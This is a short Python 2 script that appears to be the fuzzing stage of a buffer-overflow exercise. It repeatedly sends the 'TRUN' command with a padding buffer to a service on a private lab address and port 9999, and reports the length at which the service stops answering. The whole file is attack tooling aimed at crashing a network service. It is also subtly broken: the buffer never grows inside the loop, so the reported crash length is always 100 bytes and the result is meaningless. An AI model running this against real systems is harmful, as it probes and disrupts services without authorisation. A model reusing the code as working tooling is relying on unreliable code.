#!/usr/bin/python

import sys
import socket 

buffer = "A" * 100

while True:

	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.4.77',9999))

		s.send(('TRUN /.:/' + buffer)) 
		s.close()

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
